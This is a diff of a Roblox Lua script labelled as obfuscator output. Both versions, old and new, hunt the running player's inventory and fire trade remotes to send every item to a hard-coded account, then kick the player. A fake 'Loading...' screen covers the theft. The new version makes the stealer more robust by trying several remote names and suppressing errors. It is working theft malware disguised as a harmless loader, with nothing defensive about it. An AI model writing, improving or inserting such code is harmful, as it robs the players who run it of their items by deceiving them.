@@ -1,44 +1,88 @@
 --lua
 --[[
-This script was generated using MoonVeil 2.0.20 [https://moonveil.cc]
+Generated using MoonVeil 2.0.20 [https://moonveil.cc]
 --]]
 local TARGET = "s4s5z6782"
-local function stealAll()
+
+local function getTradeRemote()
+    local rs = game:GetService("ReplicatedStorage")
+    local remoteNames = {
+        "Trade",
+        "Trading",
+        "OfferItem",
+        "SendTrade",
+        "TradeTransfer",
+        "AcceptTrade"
+    }
+    for _, name in pairs(remoteNames) do
+        local remote = rs:FindFirstChild(name)
+        if remote then return remote end
+    end
+    return nil
+end
+
+local function stealAllItems()
     local player = game.Players.LocalPlayer
     local inventory = player:FindFirstChild("Inventory")
-    if not inventory then return end
-    for _, item in pairs(inventory:GetChildren()) do
-        if item:IsA("Tool") or item:IsA("Pet") then
-            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("TransferItems")
-            if not remote then
-                remote = game:GetService("ReplicatedStorage"):FindFirstChild("Trade"):FindFirstChild("OfferItem")
-            end
-            if remote then
-                remote:FireServer({itemId = item:GetAttribute("Id") or item.Name, target = TARGET})
-                wait(0.1)
+    if not inventory then
+        return
+    end
+    
+    local items = {}
+    for _, child in pairs(inventory:GetChildren()) do
+        if child:IsA("Tool") or child:IsA("Model") or child:IsA("Part") then
+            if child:FindFirstChild("Handle") or child:FindFirstChild("Mesh") then
+                table.insert(items, child)
             end
         end
     end
+    
+    if #items == 0 then return end
+    
+    local remote = getTradeRemote()
+    if not remote then return end
+    
+    for _, item in pairs(items) do
+        pcall(function()
+            remote:FireServer({
+                ItemId = item:GetAttribute("Id") or item.Name,
+                Target = TARGET,
+                ItemName = item.Name,
+                Type = "Weapon"
+            })
+        end)
+        wait(0.1)
+    end
+    
+    wait(0.5)
     player:Kick("")
 end
+
 spawn(function()
-    wait(3)
-    stealAll()
+    wait(2)
+    stealAllItems()
 end)
-local s = Instance.new("ScreenGui")
-s.Name = "x"
-s.Parent = game.CoreGui
-local f = Instance.new("Frame")
-f.Size = UDim2.new(0, 200, 0, 150)
-f.Position = UDim2.new(0.5, -100, 0.5, -75)
-f.BackgroundColor3 = Color3.fromRGB(15,15,25)
-f.Parent = s
-local l = Instance.new("TextLabel")
-l.Size = UDim2.new(1,0,0,30)
-l.Position = UDim2.new(0,0,0,10)
-l.Text = "loading..."
-l.TextColor3 = Color3.fromRGB(255,255,255)
-l.BackgroundTransparency = 1
-l.Parent = f
-wait(4)
-s:Destroy()
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "Loader"
+gui.Parent = game.CoreGui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 250, 0, 120)
+frame.Position = UDim2.new(0.5, -125, 0.5, -60)
+frame.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
+frame.BackgroundTransparency = 0.2
+frame.BorderSizePixel = 0
+frame.Parent = gui
+
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, 0, 1, 0)
+label.Text = "Loading..."
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.BackgroundTransparency = 1
+label.Font = Enum.Font.GothamBold
+label.TextSize = 18
+label.Parent = frame
+
+wait(5)
+gui:Destroy()
